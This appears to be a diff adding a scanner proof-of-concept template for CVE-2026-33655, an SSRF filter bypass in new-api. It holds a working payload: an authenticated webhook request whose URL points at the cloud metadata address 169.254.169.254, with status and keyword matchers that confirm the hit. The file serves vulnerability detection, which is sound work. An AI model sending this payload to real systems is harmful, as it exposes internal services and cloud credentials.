@@ -1,0 +1,48 @@
+[info]
+author = "AVE"
+description = "检测 new-api 默认 SSRF 保护中 ApplyIPFilterForDomain 未启用导致的域名解析绕过漏洞，通过配置 Webhook 通知 URL 指向内网 IP 验证 SSRF"
+id = "POC-AVE-2026-0259"
+name = "CVE-2026-33655 PoC"
+severity = "high"
+tags = [
+    "cve-2026-33655",
+    "ave-2026-0259",
+    "ssrf",
+]
+vuln_id = [
+    "CVE-2026-33655",
+    "AVE-2026-0259",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/notification/webhook"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"url":"http://169.254.169.254/latest/meta-data/","name":"ssrf-test"}'
+type = "json"
+
+[poc.requests.headers]
+Authorization = "Bearer {{token}}"
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    200,
+    201,
+]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "success",
+    "ok",
+]
